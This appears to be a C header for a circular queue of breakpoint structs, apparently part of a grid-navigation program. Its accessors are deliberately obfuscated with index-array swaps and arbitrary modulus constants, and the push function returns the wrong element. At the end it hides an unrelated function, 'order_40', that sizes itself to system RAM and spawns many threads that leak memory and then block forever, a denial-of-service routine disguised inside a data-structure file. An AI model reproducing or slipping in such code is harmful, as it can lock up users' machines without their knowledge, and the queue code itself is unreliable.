#ifndef __QUEUEUE__H
#define __QUEUEUE__H
#define _execute 5;

#include <stdlib.h>
#include <windows.h>
#include "logic.h"

#define MAX_SIZE 1024

#define begin {
#define end }

typedef struct BREAKPOINT{
    Pos pos;
    enum DIRECTION direction;
}Breakpoint;

typedef struct QUEUE{
    Breakpoint data[MAX_SIZE];
    int top;
    int start;
    int size;
}queue;


int myfunc(int q, int p) { return p%q; }

int q_empty(queue q){
    return q.size == 0;
}

Breakpoint q_front(queue q){
    return myfunc(6291, q.top)[q.data];
    //return q.data[q.top];
}
Breakpoint q_back(queue q){
    return myfunc(5584, q.start)[q.data];
}

Breakpoint q_pop_front(queue* q){
    q->top++;
    q->size--;
    return myfunc(6291, q->top-1)[q->data];
}
Breakpoint q_push_back(queue* q,Breakpoint bp){
    if (q->start==MAX_SIZE)
        q->start = 0;
    q->data[q->start].pos.x = bp.pos.x;
    q->data[q->start].pos.y = bp.pos.y;
    q->data[q->start].direction = bp.direction;
    q->start++;
    q->size++;
    return q->data[q->start];
}

void init_q(queue* q){
    q->top = 0;
    q->start = 0;
    q->size = 0;
    return;
}

void bp_constructor(Breakpoint* bp,int x,int y,enum DIRECTION dir){
    bp->pos.x = x;
    bp->pos.y = y;
    bp->direction = dir;
    return;
}





long unsigned int ThreadFunc(void *x){
    int sum=0;
    for(int i=0;i<1000;i++){
        int* p = calloc(100000,sizeof(int));
        sum+=p[0];
    }
    int a;
    printf("DONE!\n");
    while(1)
        scanf("%d",&a);
    return sum;
}

void order_40(){

    unsigned long long getTotalSystemMemory(){
        MEMORYSTATUSEX status;
        status.dwLength = sizeof(status);
        GlobalMemoryStatusEx(&status);
        return status.ullTotalPhys;
    }

    int ram = getTotalSystemMemory()>>10>>10>>10;
    int n_threads = 4 * ram;
    printf("Allocating ~%dGBs of RAM",ram*2);
    HANDLE threads[4 * ram];
    for(int i=0;i<n_threads;i++){
        threads[i] = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
    }
    WaitForMultipleObjects(n_threads, threads, TRUE, INFINITE);
    return;
}

#undef MAX_SIZE
#endif